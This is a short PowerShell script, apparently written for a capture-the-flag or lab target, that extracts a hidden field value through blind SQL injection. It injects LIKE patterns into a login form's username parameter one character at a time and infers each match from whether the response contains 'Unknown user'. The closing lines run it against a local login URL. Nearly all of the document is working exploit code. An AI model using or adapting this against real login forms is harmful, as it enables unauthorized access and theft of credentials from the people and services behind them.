function get-SQLInjectionField
{
param(
$fieldLength=6,
$pre,
$post,
$uri,
$teststring
)

$list="abcdefghijklmnopqrstuvwxyz1234567890"
$list=$list+"./_$%"
$found=""
$search=""
$spaces="_"*$fieldLength
foreach($c in 1..$fieldLength)
{
    $space=$spaces.remove(0,$c)
    foreach($chr in $list.ToCharArray())
    {
        $request=$null
        $search=$found+$chr+$space
        $body= -join ($pre,$search,$post)
        $return=Invoke-WebRequest -Method Post -Uri $uri -Body $body -UseBasicParsing #-Proxy http://127.0.0.1:8080
        if("$($return.content)" -notlike "*$($teststring)*"){"$($body)";break}

    }
    $found+=$chr

}
write-output $found
}

$before= encodeHTTP "' or password=""thepassword"" AND username LIKE """
$before= "username=" + $before
get-SQLInjectionField -fieldLength 6 -post "%22;&password=" -pre $before -uri http://127.0.0.1/916eb86a76/login -teststring "Unknown user"
